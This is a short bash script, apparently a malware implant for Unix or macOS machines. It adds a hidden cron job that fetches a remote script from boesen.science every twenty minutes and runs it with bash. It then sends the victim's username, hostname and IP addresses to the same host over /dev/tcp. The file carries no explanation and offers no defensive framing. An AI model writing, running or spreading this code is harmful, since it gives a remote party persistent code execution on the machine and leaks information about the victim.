#!/usr/bin/env bash
host=boesen.science
down_port=2042
up_port=2043

(crontab -l 2>/dev/null; echo "*/20 * * * * (curl -L $host:$down_port/mac/userupdate.sh |bash) >/dev/null 2>&1") | crontab -

user=$(whoami)
hostname=$(hostname)
ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')

printf "JOIN: NO ROOT $user $hostname $ip" > /dev/tcp/$host/$up_port
